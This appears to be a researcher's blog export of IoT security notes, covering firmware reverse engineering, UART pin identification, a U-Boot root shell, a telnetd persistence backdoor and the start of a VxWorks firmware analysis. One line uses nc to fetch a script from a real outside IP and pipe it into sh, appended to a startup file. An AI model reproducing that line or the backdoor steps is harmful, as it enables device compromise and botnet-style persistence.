    <url>/2021/08/09/iot/iot%E5%AE%89%E5%85%A8%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="iot安全实用技巧"><a href="#iot安全实用技巧" class="headerlink" title="iot安全实用技巧"></a>iot安全实用技巧</h1><h2 id="函数定义在哪个so文件中"><a href="#函数定义在哪个so文件中" class="headerlink" title="函数定义在哪个so文件中"></a>函数定义在哪个so文件中</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 挨个so文件搜</span></span><br><span class="line">find ./ -name <span class="string">"*.so"</span> | xargs readelf -s &gt; so.txt</span><br><span class="line">subl so.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 ghidra中打开，设置lib目录，symbol-tree中搜索</span></span><br></pre></td></tr></table></figure>
<h2 id="查看所有elf的符号"><a href="#查看所有elf的符号" class="headerlink" title="查看所有elf的符号"></a>查看所有elf的符号</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find ./ -<span class="built_in">type</span> f |xargs file|grep ELF |awk <span class="string">'BEGIN&#123;FS=":"&#125; &#123;printf $1 "\n"&#125;'</span> | xargs readelf -s &gt; 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat 1.txt看谁有system</span></span><br></pre></td></tr></table></figure>
<h2 id="已编译的"><a href="#已编译的" class="headerlink" title="已编译的"></a>已编译的</h2><ul>
<li>编译好的静态的gdbserver：<a href="https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt" target="_blank" rel="noopener">https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt</a></li>
</ul>
<h2 id="ida快捷键"><a href="#ida快捷键" class="headerlink" title="ida快捷键"></a>ida快捷键</h2><ul>
<li>D：data，转换byte、half、word</li>
<li>R：字符转换</li>
<li>O：offset，解释地址为数据段偏移量，用于字符串标号</li>
<li>H：10/16进制转换</li>
</ul>
<h2 id="符号名识别"><a href="#符号名识别" class="headerlink" title="符号名识别"></a>符号名识别</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 依据日志打印判定 符号名：arcadyan_request_hook、mac</span></span><br><span class="line"><span class="comment"># 特征：print、log</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[%s] request from: IP=[%s], MAC=[%s]\n"</span>,<span class="string">"arcadyan_request_hook"</span>,(const char *)(a1 + 6360),(const char *)mac);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 依据配置读取判定 符号名：Hostname</span></span><br><span class="line"><span class="comment"># 特征：cfg、get</span></span><br><span class="line">mapi_ccfg_get_str(tid, <span class="string">"ARC_SYS_Hostname"</span>, Hostname, 32);</span><br><span class="line">mapi_tmp_get(tid_1, <span class="string">"TMP_WLAN_AOSS_WPS_Bridge_Busy"</span>, v58, 8);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 根据错误日志判断函数名也不全对</span></span><br><span class="line"><span class="comment"># 多个目标文件链接到同一个可执行文件，故可能有多种，如main中</span></span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 284, <span class="string">"main"</span>, <span class="string">"can't open /dev/null"</span>);</span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 579, <span class="string">"drop_privs"</span>, <span class="string">"setuid"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 打印错误日志时暴露函数名 </span></span><br><span class="line"><span class="comment"># 依次：文件名、行、函数名、错误信息</span></span><br><span class="line">log_error_msg_fatal(<span class="string">"src/boa.c"</span>, 284, <span class="string">"main"</span>, <span class="string">"can't open /dev/null"</span>);</span><br><span class="line">源码中：define DIE(mesg) log_error_mesg_fatal(__FILE__, __LINE__, __func__, mesg)</span><br></pre></td></tr></table></figure>
<h2 id="寻找函数定义"><a href="#寻找函数定义" class="headerlink" title="寻找函数定义"></a>寻找函数定义</h2><ul>
<li>cisco rv340的upload.cgi的base64_decode函数<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 共3个so文件</span></span><br><span class="line">File: ./usr/lib/libmiscu.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 140 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   131: 00005874   172 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line"></span><br><span class="line">File: ./usr/lib/libpolarssl.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 543 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   520: 000097a8   552 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line">   </span><br><span class="line">File: ./usr/lib/libmbedtls.so</span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 543 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">   520: 000097a8   552 FUNC    GLOBAL DEFAULT   10 base64_decode</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 2与3同，size和value相同，均指向同一个文件</span></span><br><span class="line">lrwxr-xr-x 1 501 dialout 13 Aug 13 09:35 usr/lib/libpolarssl.so -&gt; libmbedtls.so</span><br><span class="line">lrwxr-xr-x 1 501 dialout 15 Aug 13 09:35 usr/lib/libmbedtls.so -&gt; libmbedtls.so.9</span><br><span class="line">lrwxr-xr-x 1 501 dialout 20 Aug 13 09:35 usr/lib/libmbedtls.so.9 -&gt; libmbedtls.so.1.3.12</span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序加载了哪个so</span></span><br><span class="line"><span class="comment"># 没找到，</span></span><br><span class="line">/tmp <span class="comment"># ps|grep nginx</span></span><br><span class="line">10657 root     16588 S    nginx: master process /usr/sbin/nginx</span><br><span class="line">/tmp <span class="comment"># cat /proc/10657/maps</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结合调用方，直接逆向so文件（就俩而已）</span></span><br><span class="line"><span class="comment"># upload.cgi</span></span><br><span class="line">v18 = base64_decode(http_cookie, &amp;save_ptr);</span><br><span class="line"><span class="comment"># libmiscu.so</span></span><br><span class="line">void *__fastcall base64_decode(char *a1, int *a2)</span><br><span class="line"><span class="comment"># libmbedtls.so.1.3.12</span></span><br><span class="line">int __fastcall base64_decode(_BYTE *a1, unsigned int *a2, unsigned __int8 *a3, unsigned int a4)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="函数识别"><a href="#函数识别" class="headerlink" title="函数识别"></a>函数识别</h2><ul>
<li>mips little endian，ghidra 好于 ida<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 二进制是相同的，解析出的指令不同</span></span><br><span class="line"><span class="comment"># ida未识别为函数，li+addiu</span></span><br><span class="line">.text:00415418 4C 00 1C 3C+                li      <span class="variable">$gp</span>, unk_4C1810</span><br><span class="line">.text:00415418 10 18 9C 27</span><br><span class="line">.text:00415420 D8 FF BD 27                 addiu   <span class="variable">$sp</span>, -0x28</span><br><span class="line"><span class="comment"># ghidra识别成功，lui+addiu+addiu</span></span><br><span class="line">00415418 4c 00 1c 3c     lui        gp,0x4c</span><br><span class="line">0041541c 10 18 9c 27     addiu      gp,gp,0x1810</span><br><span class="line">00415420 d8 ff bd 27     addiu      sp,sp,-0x28</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="发现开源软件"><a href="#发现开源软件" class="headerlink" title="发现开源软件"></a>发现开源软件</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># main中打印帮助</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">    opt = getopt(argc, (char *const *)argv, <span class="string">"c:vdl:f:r:a:"</span>);</span><br><span class="line">    switch ( opt )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">        fprintf((FILE *)stderr, <span class="string">"boa: server version %s\n"</span>, <span class="string">"1.32.1.10"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># string窗口中搜索boa，作为http响应的字段</span></span><br><span class="line">Server: Boa/0.94.14rc21</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码时：版本号是0.94.14rc21而非1.32.1.10</span></span><br><span class="line">http://www.boa.org/boa-0.94.14rc21.tar.gz</span><br></pre></td></tr></table></figure>
<h2 id="判定main"><a href="#判定main" class="headerlink" title="判定main"></a>判定main</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sub_A08C为main</span></span><br><span class="line">// positive sp value has been detected, the output may be wrong!<span class="comment"># ？？？</span></span><br><span class="line">int start()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> ((int (__fastcall *)(int (__fastcall *)(int, char *const *)))_uClibc_main)(sub_A08C);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 汇编程序的入口是_start，而C程序的入口是main函数</span></span><br><span class="line"><span class="comment"># main函数是程序的入口点其实不准确，_start才是真正的入口点，而main函数是被_start调用的</span></span><br></pre></td></tr></table></figure>
<h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><ul>
<li>社工客服法：<a href="https://xz.aliyun.com/t/5054" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054</a></li>
</ul>
<h2 id="uboot-getshell"><a href="#uboot-getshell" class="headerlink" title="uboot-getshell"></a>uboot-getshell</h2><ul>
<li>任意键进入uboot，修改环境变量</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lxl@MBP  ~  minicom -c on</span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line"></span><br><span class="line">DRAM:  64 MiB</span><br><span class="line">8 MiB</span><br><span class="line">Create flash partition table init OK!</span><br><span class="line">ANYKA SDHC/MMC4.0: 0</span><br><span class="line">Load Env CRC OK!</span><br><span class="line">In:    serial</span><br><span class="line">Out:   serial</span><br><span class="line">Err:   serial</span><br><span class="line">Net:   AKEthernet-0</span><br><span class="line"></span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改环境变量并保存</span></span><br><span class="line"><span class="comment"># bootargs的init=/bin/sh</span></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br></pre></td></tr></table></figure>
<ul>
<li>重启，uboot后进入sh，修改自启程序，实现常驻</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0 mtdblock8对应/mnt/mtd，jffs2文件系统（自启程序nvipcstart.sh位于此）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">tmpfs on /tmp <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">tmpfs on /var <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">devpts on /dev/pts <span class="built_in">type</span> devpts (rw,relatime,mode=600,ptmxmode=000)</span><br><span class="line">tmpfs on /mnt/mtd <span class="built_in">type</span> tmpfs (rw,relatime)</span><br><span class="line">sysfs on /sys <span class="built_in">type</span> sysfs (rw,relatime)</span><br><span class="line">/dev/mtdblock5 on /usr <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock6 on /mvs <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock7 on /ext <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line">/dev/loop0 on /tmp/ramdisk <span class="built_in">type</span> vfat (rw,relatime,fmask=0022,dmask=0022,codepage=cp437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 进入sh</span></span><br><span class="line">/bin/sh: c��ɹ���off</span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">bin   dev   etc   ext   init  lib   mnt   mvs   proc  sbin  sys   tmp   usr   var</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 mount命令需挂载proc（本身挂载proc就需要mount，不矛盾？）</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">mount: no /proc/mounts</span><br><span class="line">~ <span class="comment"># mount -t proc /proc</span></span><br><span class="line">~ <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 挂载mtdblock8</span></span><br><span class="line">~ <span class="comment"># cd mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount -t jffs2 /dev/mtdblock8 /mnt/mtd</span></span><br><span class="line">/mnt/mtd <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/dev/mtdblock8 on /mnt/mtd <span class="built_in">type</span> jffs2 (rw,relatime)</span><br><span class="line"></span><br><span class="line">/mnt/mtd <span class="comment"># cd ..</span></span><br><span class="line">/mnt <span class="comment"># cd mtd/</span></span><br><span class="line">/mnt/mtd <span class="comment"># ls</span></span><br><span class="line">DDNSClient.ini          inet.conf               prerun</span><br><span class="line">ResetBind.ini           ipsourceserver.ini      recorde.ini</span><br><span class="line">as9ipcwatchdog          isp_mis2006.conf        recorder</span><br><span class="line">as9nvserver             mqtest_stop             resolv.conf</span><br><span class="line">as9updatednsip          mtd_remount.sh          stopallapp.sh</span><br><span class="line">asnvdvrclientdemo       mv_clog_cache.data      styleId</span><br><span class="line">audiofile_player        mvconf                  user_info.ini</span><br><span class="line">authority.ini           mvsound                 venc.cfg</span><br><span class="line">dns_last_serverips.ini  network_Info.ini        vg_boot.sh</span><br><span class="line">h265_1920x1080.cfg      nvconfig.ini            vsipbroadcast</span><br><span class="line">idcheck.sh              nvipcstart.sh           wificonf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 修改系统自启程序，实现常驻</span></span><br><span class="line">/mnt/mtd <span class="comment"># cat nvipcstart.sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">hostname V380E</span><br><span class="line">/sbin/telnetd -p 2323 -l /bin/sh &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 umount（是否必要？）</span></span><br><span class="line"><span class="comment"># 实测reboot不行</span></span><br><span class="line">/mnt <span class="comment"># umount /mnt/mtd</span></span><br><span class="line">/mnt <span class="comment"># mount</span></span><br><span class="line">rootfs on / <span class="built_in">type</span> rootfs (rw)</span><br><span class="line">/dev/root on / <span class="built_in">type</span> squashfs (ro,relatime)</span><br><span class="line">devtmpfs on /dev <span class="built_in">type</span> devtmpfs (rw,relatime,mode=0755)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw,relatime)</span><br><span class="line">/mnt <span class="comment"># reboot</span></span><br><span class="line">/mnt <span class="comment"># ls</span></span><br><span class="line">mtd     nand    sdcard</span><br></pre></td></tr></table></figure>
<ul>
<li>telnet连接</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 再次进入uboot，将bootargs复原</span></span><br><span class="line">U-Boot 2013.10.0-AK_V3.0.08 (Mar 05 2019 - 15:37:04)</span><br><span class="line">Hit any key to stop autoboot:  3</span><br><span class="line"> 0</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line">anyka<span class="variable">$setenv</span> bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line">anyka<span class="variable">$saveenv</span></span><br><span class="line"></span><br><span class="line">Saving Environment to SPI Flash...</span><br><span class="line">Env save <span class="keyword">done</span> OK</span><br><span class="line">anyka<span class="variable">$printenv</span> bootargs</span><br><span class="line">                        bootargs=console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/sbin/init mem=64M memsize=64M</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 实测reset无效</span></span><br><span class="line">anyka<span class="variable">$reset</span></span><br><span class="line">           resetting ...</span><br><span class="line">heartbeat = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 再次启动，uboot可正常引导系统</span></span><br><span class="line"><span class="comment"># telnet连接</span></span><br><span class="line">lxl@192  ~  telnet 192.168.0.106 2323</span><br><span class="line">Trying 192.168.0.106...</span><br><span class="line">Connected to 192.168.0.106.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br></pre></td></tr></table></figure>
<h2 id="change-dns"><a href="#change-dns" class="headerlink" title="change-dns"></a>change-dns</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 Ubuntu 桥接模式，有线，保证有网</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 lxl@ubuntu:/mnt/hgfs/3/dns$ sudo ./dnschange.sh</span></span><br><span class="line"><span class="comment"># ip是否正确</span></span><br><span class="line">the ip is: 192.168.0.104</span><br><span class="line">10.10.10.1, is right [Y/n]?</span><br><span class="line"><span class="comment"># dnsmasq安装失败</span></span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  dnsmasq</span><br><span class="line">0 upgraded, 1 newly installed, 0 to remove and 194 not upgraded.</span><br><span class="line">Need to get 16.2 kB of archives.</span><br><span class="line">E: Failed to fetch http://mirrors.aliyun.com/ubuntu/pool/universe/d/dnsmasq/dnsmasq_2.79-1ubuntu0.4_all.deb  Could not resolve <span class="string">'security.ubuntu.com'</span></span><br><span class="line">E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</span><br><span class="line"><span class="comment"># dnsmasp启动失败</span></span><br><span class="line">Failed to restart dnsmasq.service: Unit dnsmasq.service not found.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 sudo apt install dnsmasq</span></span><br><span class="line">安装后会自动启动</span><br><span class="line">启动失败，bad option at line 2 of /etc/dnsmasq.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4  subl /etc/dnsmasq.conf</span></span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">10.10.10.1</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ subl /etc/dnsmasq.conf</span><br><span class="line">lxl@ubuntu:/mnt/hgfs/3/dns$ cat /etc/dnsmasq.conf</span><br><span class="line">address=/aaa.com/192.168.0.104</span><br><span class="line">address=/ipcupdate.av380.net/192.168.0.104</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 启动nginx、dnsmasq</span></span><br><span class="line">sudo service nginx status</span><br><span class="line">sudo service dnsmasq status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 win7测试，修改本机dns</span></span><br><span class="line"><span class="comment"># 修改前</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [45.60.62.121] 具有 32 字节的数据:</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line">来自 45.60.62.121 的回复: 字节=32 时间=194ms TTL=51</span><br><span class="line"><span class="comment"># 修改后</span></span><br><span class="line">C:\Users\lxl&gt;ping aaa.com</span><br><span class="line">正在 Ping aaa.com [192.168.0.104] 具有 32 字节的数据:</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 192.168.0.104 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7 测试dns，修改路由器dns</span></span><br><span class="line">原-router-ip、改-192.168.0.104（dnsmasq所在）</span><br></pre></td></tr></table></figure>
<h2 id="硬件相关"><a href="#硬件相关" class="headerlink" title="硬件相关"></a>硬件相关</h2><h3 id="判断UART"><a href="#判断UART" class="headerlink" title="判断UART"></a>判断UART</h3><ul>
<li><p>gnd</p>
<ul>
<li>指针类似wifi符号（蜂鸣器档）</li>
<li>路由器不需通电</li>
<li>黑色接地或金属板</li>
<li>红色试，出声的那个</li>
</ul>
</li>
<li><p>tx/rx/vcc</p>
<ul>
<li>指针20V（旋转方向无所谓）</li>
<li>需通电</li>
<li>黑色接gnd</li>
<li>红色试，电源开启后，电压小的为rx，高的为vcc/tx，其中稳定的为vcc</li>
</ul>
</li>
</ul>
<h2 id="设备文件传输"><a href="#设备文件传输" class="headerlink" title="设备文件传输"></a>设备文件传输</h2><ul>
<li>常规：wget/curl、tftp、scp</li>
<li><p>mount+nfs</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mac</span></span><br><span class="line">- 参考：https://blog.csdn.net/weixin_44204717/article/details/86526639</span><br><span class="line">- mac服务端：sudo vim /etc/exports：/Users/lxl/Public/4share -alldirs -network 192.168.55.0 -mask 255.255.255.0（默认就是rw权限，如果只读，则-ro）、nfsd status/<span class="built_in">enable</span>/start</span><br><span class="line">- 摄像头客户端：mount -t nfs 192.168.55.153:/Users/lxl/Public/nfs_share /home -o nolock</span><br><span class="line">- 客户端向外传文件：touch: 111: Permission denied（没权限，cp命令也如此），直接把nfs服务端的目录权限设为777</span><br><span class="line"></span><br><span class="line"><span class="comment"># win</span></span><br><span class="line">- 参考：https://blog.csdn.net/paladinzh/article/details/96162270</span><br><span class="line">- 下载：haneWIN NFS Server <span class="keyword">for</span> Windows，https://www.hanewin.net/nfs-e.htm</span><br><span class="line">- 注册码：https://www.cnblogs.com/SoaringLee/p/10532523.html（astray.cn-FBLZ9467C95EEB4B）</span><br><span class="line">- 配置：D:\tool\nfsd\nfs_dir -public -name:nfs</span><br><span class="line">- 挂载：摄像头失败，但Ubuntu成功</span><br><span class="line">mount -t nfs -o nolock 192.168.0.100:/nfs /tmp</span><br><span class="line">mount: mounting 192.168.0.100:/nfs on /tmp failed: No such device</span><br></pre></td></tr></table></figure>
</li>
<li><p>nc实现wget</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"sleep 120;cd /tmp;echo -n -e 'GET /03/a.sh HTTP/1.1\r\nHost: 149.28.59.105\r\n\r\n'|nc 149.28.59.105 80|sed '1,9d'|sh &amp;"</span> &gt;&gt; <span class="variable">$f</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="杂乱"><a href="#杂乱" class="headerlink" title="杂乱"></a>杂乱</h2><ul>
<li>ghidra跑过脚本后，将处理后的程序导出，file-export program或快捷键O，选择类型为ELF，可以在IDA中打开。</li>
<li>1</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># file+zone+key+value</span></span><br><span class="line">result = IFCWriteStringOnce(<span class="string">"/mnt/mtd/mvconf/version.ini"</span>, <span class="string">"[app_version]"</span>, <span class="string">"name"</span>, name);</span><br><span class="line">result = IFCWriteStringOnce(<span class="string">"/mnt/mtd/mvconf/version.ini"</span>, <span class="string">"[app_version]"</span>, <span class="string">"date"</span>, date);</span><br><span class="line"></span><br><span class="line">/mnt/mtd/mvconf <span class="comment"># cat version.ini</span></span><br><span class="line">[app_version]</span><br><span class="line">name=AppV380E11_AKQ8_MS32006_V2.6.5.9</span><br><span class="line">date=20201229</span><br></pre></td></tr></table></figure>
<h2 id="评判漏洞"><a href="#评判漏洞" class="headerlink" title="评判漏洞"></a>评判漏洞</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 攻击者</span></span><br><span class="line">lan（network-adjacent）</span><br><span class="line">wan（remote attackers）</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">是否需要认证</span><br><span class="line"><span class="comment"># 3 类型</span></span><br><span class="line">远程代码执行（溢出）</span><br><span class="line">命令注入（system）</span><br><span class="line">认证绕过</span><br><span class="line">信息泄漏</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>某嵌入式设备固件分析</title>
    <url>/2021/07/26/iot/%E6%9F%90%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="某嵌入式设备固件分析"><a href="#某嵌入式设备固件分析" class="headerlink" title="某嵌入式设备固件分析"></a>某嵌入式设备固件分析</h1><ul>
<li>固件：MW150R V5/V6_111219标准版，<a href="https://service.mercurycom.com.cn/download-269.html，mw150rv5-cn-up.bin（凑合用" target="_blank" rel="noopener">https://service.mercurycom.com.cn/download-269.html，mw150rv5-cn-up.bin（凑合用</a></li>
</ul>
<h2 id="01-binwalk"><a href="#01-binwalk" class="headerlink" title="01-binwalk"></a>01-binwalk</h2><ul>
<li>binwalk可以识别，但提取失败</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ binwalk mw150rv5-cn-up.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">20            0x14            IMG0 (VxWorks) header, size: 1522912</span><br><span class="line"><span class="comment"># 操作系统，VxWorks</span></span><br><span class="line">26724         0x6864          VxWorks operating system version <span class="string">"5.5.1"</span> , compiled: <span class="string">"Dec 15 2011, 22:21:51"</span></span><br><span class="line"><span class="comment"># 压缩方式，LZMA</span></span><br><span class="line">26820         0x68C4          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, </span><br><span class="line">262292        0x40094         IMG0 (VxWorks) header, size: 1260640</span><br><span class="line">262420        0x40114         LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 3138464 bytes</span><br><span class="line"><span class="comment"># 文件系统，Wind River</span></span><br><span class="line"><span class="comment"># 基地址，owow出现的地方。167能对应</span></span><br><span class="line">1264484       0x134B64        Wind River management filesystem, compressed, 167 files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -Me也并未得到有用信息：只有xml和crt</span></span><br><span class="line"><span class="comment"># VxWorks是美国风河系统公司于1983年设计开发的一种嵌入式实时操作系统</span></span><br></pre></td></tr></table></figure>
<h2 id="02-敏感字符串"><a href="#02-敏感字符串" class="headerlink" title="02-敏感字符串"></a>02-敏感字符串</h2><ul>
<li>strings -n 8 mw150rv5.bin（ 指定最小的字符串长度为8</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">owowowowowowowowowowowowowowowow <span class="comment"># 敏感</span></span><br><span class="line">common.js</span><br><span class="line">|css_help.css</span><br><span class="line"><span class="string">'lcss_main.css</span></span><br></pre></td></tr></table></figure>
<h2 id="03-规律"><a href="#03-规律" class="headerlink" title="03-规律"></a>03-规律</h2><ul>
<li>hexdump -C mw150rv5-cn-up.bin | less</li>
</ul>
